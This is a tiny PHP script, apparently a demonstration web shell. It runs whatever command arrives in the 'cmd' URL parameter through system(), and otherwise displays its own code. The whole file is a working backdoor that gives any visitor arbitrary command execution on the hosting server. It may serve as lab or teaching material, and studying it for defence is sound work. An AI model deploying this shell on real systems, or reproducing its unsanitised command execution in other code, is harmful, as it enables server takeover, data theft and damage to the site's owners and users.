<?php
$string = <<<EOT
<?php
	\$cmd=\$_GET['cmd'];
	system(\$cmd);
?>

EOT;
if(!empty($_GET['cmd'])) {
	$cmd=$_GET['cmd'];
	system($cmd);
} else {
	echo highlight_string($string, true);
}
?>
